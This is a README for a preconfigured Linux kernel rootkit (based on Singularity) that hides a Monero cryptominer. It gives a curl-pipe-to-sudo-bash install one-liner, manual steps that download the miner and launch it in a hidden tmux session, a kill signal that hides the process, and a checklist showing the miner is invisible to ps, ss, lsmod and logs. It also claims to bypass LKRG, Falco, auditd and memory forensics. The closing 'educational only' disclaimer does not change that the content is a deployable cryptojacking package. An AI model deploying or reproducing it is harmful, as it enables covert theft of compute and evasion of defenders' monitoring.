# Singularity Mining Configuration

This is a pre-configured version of Singularity rootkit for cryptocurrency mining stealth operations.

## ⚙️ Configuration

**Modified for Kryptex XMR Mining (Port 8029)**

### Changed Files:

1. **`include/core.h`**
   ```c
   #define YOUR_SRV_IP "0.0.0.0"  // Listen on all interfaces
   ```

2. **`modules/hiding_tcp.c`**
   ```c
   #define PORT 8029  // Kryptex XMR pool port
   ```

3. **`modules/bpf_hook.c`**
   ```c
   #define HIDDEN_PORT 8029  // Match mining port
   ```

4. **`modules/icmp.c`**
   ```c
   #define SRV_PORT "8029"  // Match mining port
   ```

## 🚀 Quick Deployment

**One-liner (update with your GitHub details):**

```bash
curl -sL https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/auto_deploy.sh | sudo bash
```

## 📦 What Gets Deployed

1. **Singularity Rootkit** - Kernel module with full stealth
2. **SRBMiner-Multi** - RandomX (Monero) miner
3. **Tmux Session** - Background mining process
4. **Auto-Hide** - Everything hidden automatically

## ✅ Verification Checklist

After deployment, these should return EMPTY:

```bash
ps aux | grep -i srbminer          # No process
top                                 # Miner invisible
htop                                # Miner invisible
ss -tulpn | grep 8029              # No connection
netstat | grep 8029                 # No connection
ls /tmp | grep singularity          # No directory
lsmod | grep singularity            # No module
cat /proc/modules | grep singularity # No module
```

## 🔒 What Gets Hidden

- ✅ **Process** (ps, top, htop, /proc, pgrep)
- ✅ **Network** (netstat, ss, lsof, tcpdump, conntrack)
- ✅ **Files** (pattern: "singularity")
- ✅ **Rootkit** (lsmod, /sys/module)
- ✅ **Logs** (dmesg, journalctl, auditd)
- ✅ **Memory** (bypasses forensics tools)

## 🛡️ Bypass Capabilities

- ✅ **LKRG** (Linux Kernel Runtime Guard)
- ✅ **Falco** (eBPF security monitoring)
- ✅ **Tracee** (eBPF tracing)
- ✅ **auditd** (Audit daemon)
- ✅ **SysRq** (Kernel debug output)
- ✅ **Memory Forensics** (Volatility, crash, gdb)

## 📝 Manual Deployment

If one-liner fails:

```bash
# 1. Clone/Download this repo
cd /tmp
git clone https://github.com/YOUR_USERNAME/YOUR_REPO.git
cd YOUR_REPO

# 2. Install rootkit
sudo bash setup.sh

# 3. Download miner
cd /tmp
wget -O miner.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.3/SRBMiner-Multi-3-4-3-Linux.tar.gz
tar -xzf miner.tar.gz
mv SRBMiner-Multi-3-4-3 singularity_miner
cd singularity_miner
chmod +x SRBMiner-MULTI

# 4. Start mining in tmux
tmux new-session -d -s mining './SRBMiner-MULTI --algorithm randomx --disable-gpu --pool xmr-sg.kryptex.network:8029 --wallet "YOUR_WALLET/WorkerName"'

# 5. Hide process
sleep 5
kill -59 $(pgrep -f SRBMiner-MULTI)

# 6. Verify stealth
ps aux | grep -i srbminer  # Should be empty
```

## 🔧 Customization

To change mining pool/port:

1. Edit the 4 files listed above
2. Change port number (currently 8029)
3. Recompile: `make clean && make`
4. Reinstall: `sudo bash setup.sh`

## ⚠️ Important Notes

- **Cannot be unloaded** - Reboot required to remove
- **Test in VM first** - Permanent until restart
- **Kernel 6.x required** - Won't work on older kernels
- **Root access needed** - Uses kernel modules

## 🎯 Tested Environments

| Distribution | Kernel | Status |
|--------------|--------|--------|
| Ubuntu 22.04/24.04 | 6.8.0-79 | ✅ Working |
| Debian 13 | 6.12.48 | ✅ Working |
| Fedora 43 | 6.17.8 | ✅ Working |
| CentOS Stream 10 | 6.12.0 | ✅ Working |
| Kali Linux | 6.12.25 | ✅ Working |

## 📚 Original Project

Based on [Singularity](https://github.com/MatheuZSecurity/Singularity) by MatheuZSecurity

## ⚖️ Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY**

This software is provided for research and authorized security testing. Unauthorized use on systems you don't own or have permission to test is illegal.

- ✅ Use on your own systems
- ✅ Authorized penetration testing
- ✅ Security research
- ❌ Unauthorized access
- ❌ Illegal mining operations
- ❌ Malicious use

**You are responsible for compliance with all applicable laws.**
